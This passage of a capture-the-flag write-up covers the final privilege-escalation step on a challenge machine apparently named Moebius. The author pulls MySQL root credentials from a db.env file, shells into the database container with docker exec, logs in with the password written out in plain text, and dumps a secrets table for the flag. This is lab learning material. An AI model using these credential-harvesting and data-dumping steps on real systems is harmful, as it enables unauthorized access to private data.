![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fz5U3rjwQYY7fgrA2QKTe%252FScreenshot%2520%281014%29.png%3Falt%3Dmedia%26token%3D01a2913b-c0cc-44f5-bb53-cd5186de0c84&width=768&dpr=3&quality=100&sign=a00fcecf&sv=2)

## Privilege Escalation

Where's the root flag?? Let's dig deeper!!

### Finding Database Credentials in docker-compose.yml

I navigate to the `challenge` directory, I saw a `docker-compose.yml` . This is the content

```text
version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
    restart: always
```

Inside the `/root/challenge/db/db.env` file, we uncover the credentials needed to access the MySQL server with root privileges.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD6voXgbPuaKUziz2Juxn%252FScreenshot%2520%281017%29.png%3Falt%3Dmedia%26token%3Dc9e9b3e8-f831-46ac-9d65-cfaaddbd2a0e&width=768&dpr=3&quality=100&sign=ce2bd0f6&sv=2)

Given that the environment is Dockerized, our initial step is to enumerate all running containers.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FiDG9q4YPEHpmUrbCyeuw%252FScreenshot%2520%281018%29.png%3Falt%3Dmedia%26token%3D11e512e7-4338-4653-9968-30fb17fd6403&width=768&dpr=3&quality=100&sign=41606294&sv=2)

It turns out that one of the containers is hosting the database service!

### Extracting the Root Flag from the Database Container

To interact directly with the database container, we can attach a shell session to it by executing the following command

```shell
docker exec -it 8936 bash
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMVZMFIwes5qm0TBTyL6M%252FScreenshot%2520%281020%29.png%3Falt%3Dmedia%26token%3D8c4e11d5-3c6e-4336-974f-4edd1a68976c&width=768&dpr=3&quality=100&sign=5e3a2638&sv=2)

With the credentials found in the `db.env` file, we can now log in to the database and begin exploring its contents.

```shell
mysql -u root -pgG4i8NFNkcHBwUpd
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD42KHenQjCZPcLtQ8THL%252FScreenshot%2520%281021%29.png%3Falt%3Dmedia%26token%3D99006d57-5634-486a-a433-1f962284c9ea&width=768&dpr=3&quality=100&sign=e495eedc&sv=2)

Next thing that we will do is to list the databases.

```shell
show databases;
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6vwcgF7y40KrA5xW26ly%252FScreenshot%2520%281022%29.png%3Falt%3Dmedia%26token%3D55ed518a-f3c8-4de8-989c-0f2faecf5063&width=768&dpr=3&quality=100&sign=8203133e&sv=2)

So there's a **secret** database here, let's use that and list its tables.

```shell
use secret;
```

and

```shell
show tables;
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvUcdECLzJYZYnq3EejN6%252FScreenshot%2520%281024%29.png%3Falt%3Dmedia%26token%3Dfa83ec8a-48a1-4a46-bff7-b74e93871c8e&width=768&dpr=3&quality=100&sign=520f29ac&sv=2)

The secret database only contained one table named **secrets.** All we need to do is to get all the data inside that table.

```shell
select * from secrets;
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5enf6UxOVyeaeokT2LEx%252FScreenshot%2520%281025%29.png%3Falt%3Dmedia%26token%3D8ba46cf0-7ba4-4882-905d-a4dcc7116caa&width=768&dpr=3&quality=100&sign=bdc597b8&sv=2)

And it gave us the root flag!!!! At this point, we've successfully pwned Moebius!!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FzpOguL89TtbA0lWNQWoX%252FScreenshot%2520%28964%29.png%3Falt%3Dmedia%26token%3D5f26aa8f-5afb-455c-8572-688db183d1cb&width=768&dpr=3&quality=100&sign=fa1bbe8e&sv=2)

## Conclusion

This challenge was an intense journey, filled with twists and turns — from exploiting SQL Injection and LFI vulnerabilities to achieving RCE and diving into Docker configurations. It tested a variety of skills and kept me on my toes the entire time. Overall, it was a fantastic learning experience that pushed me to think outside the box and use creative approaches to overcome each obstacle. Definitely a memorable ride in the world of security challenges!
